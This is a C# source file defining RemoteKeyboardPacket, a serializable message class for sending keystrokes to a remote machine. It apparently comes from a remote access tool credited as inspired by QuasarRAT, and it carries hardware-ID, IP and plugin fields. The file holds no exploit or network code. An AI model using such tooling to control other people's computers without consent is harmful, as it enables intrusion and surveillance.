using System;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
|| Inspiration : QuasarRAT  ||
*/

namespace PacketLib.Packet
{
    [Serializable]
    public class RemoteKeyboardPacket : IPacket
    {
        public RemoteKeyboardPacket(byte keyCode, bool isDown) : base()
        {
            this.PacketType = PacketType.RM_KEYBOARD;

            this.keyCode = keyCode;
            this.isDown = isDown;
        }

        public string HWID { get; set; }
        public string BaseIp { get; set; }
        public byte[] Plugin { get; set; }
        public PacketType PacketType { get; }
        public PacketState PacketState { get; set; }
        public string Status { get; set; }
        public string DatePacketStatus { get; set; }
        public int PacketSize { get; set; }

        public byte keyCode { get; set; }
        public bool isDown { get; set; }
    }
}
